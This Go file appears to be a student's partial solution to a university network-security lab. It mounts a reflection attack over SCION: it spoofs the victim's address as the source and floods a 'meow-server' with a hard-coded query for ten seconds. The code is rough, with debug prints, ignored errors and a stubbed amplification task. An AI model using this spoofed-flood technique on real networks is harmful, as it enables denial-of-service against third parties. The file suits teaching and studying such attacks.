package client

import (
	// All of these imports were used for the mastersolution
	// "encoding/json"
	// "fmt"
	// "log"
	// "net"
	// "sync" // TODO uncomment any imports you need (go optimizes away unused imports)
	"context"
	"fmt"
	"log"
	"time"

	"github.com/scionproto/scion/go/lib/daemon"
	"github.com/scionproto/scion/go/lib/snet"

	// "ethz.ch/netsec/isl/handout/attack/server"
	"github.com/scionproto/scion/go/lib/addr"
	// "github.com/scionproto/scion/go/lib/daemon"
	"github.com/scionproto/scion/go/lib/sock/reliable"
	// "github.com/scionproto/scion/go/lib/spath"
)

func GenerateAttackPayload() []byte {
	// TODO: Amplification Task
	return make([]byte, 0)
}

func Attack(ctx context.Context, meowServerAddr string, spoofedAddr *snet.UDPAddr, payload []byte) (err error) {

	// The following objects might be useful and you may use them in your solution,
	// but you don't HAVE to use them to solve the task.

	// Context
	meow_addr, err := snet.ParseUDPAddr(meowServerAddr)
	fmt.Printf("fdfdf: %s\n", meowServerAddr)
	ctx, cancel := context.WithTimeout(context.Background(), 1*time.Second)
	defer cancel()

	// Here we initialize handles to the scion daemon and dispatcher running in the namespaces

	// SCION dispatcher
	dispSockPath, err := DispatcherSocket()
	if err != nil {
		log.Fatal(err)
	}
	dispatcher := reliable.NewDispatcher(dispSockPath)

	// SCION daemon
	sciondAddr := SCIONDAddress()
	if err != nil {
		log.Fatal(err)
	}
	sciondConn, err := daemon.NewService(sciondAddr).Connect(ctx)
	if err != nil {
		log.Fatal(err)
	}
	ia, err := sciondConn.LocalIA(ctx)
	netnet := snet.NewNetwork(ia, dispatcher, nil)
	conn, err := netnet.Dial(ctx, "udp", spoofedAddr.Host, meow_addr, addr.SvcNone)
	fmt.Println(netnet)
	// TODO: Reflection Task
	// Set up a scion connection with the meow-server
	// and spoof the return address to reflect to the victim.
	// Don't forget to set the spoofed source port with your
	// personalized port to get feedback from the victims.
	payload = []byte{123, 34, 72, 34, 58, 123, 34, 73, 100, 34, 58, 48, 44, 34, 70, 34, 58, 123, 34, 72, 34, 58, 34, 116, 34, 44, 34, 86, 34, 58, 34, 117, 34, 44, 34, 77, 34, 58, 34, 110, 34, 44, 34, 68, 34, 58, 34, 97, 34, 125, 125, 44, 34, 66, 34, 58, 123, 34, 81, 117, 101, 114, 121, 34, 58, 34, 54, 55, 53, 51, 52, 34, 125, 44, 32, 34, 116, 117, 110, 97, 34, 58, 32, 116, 114, 117, 101, 125}
	// ret, err := conn.Write(payload)
	// fmt.Println(ret)
	// fmt.Println(err)

	for start := time.Now(); time.Since(start) < 10*1e9; {
		conn.Write(payload)
		// fmt.Println(ret)
		// fmt.Println(err)

	}
	return nil
}
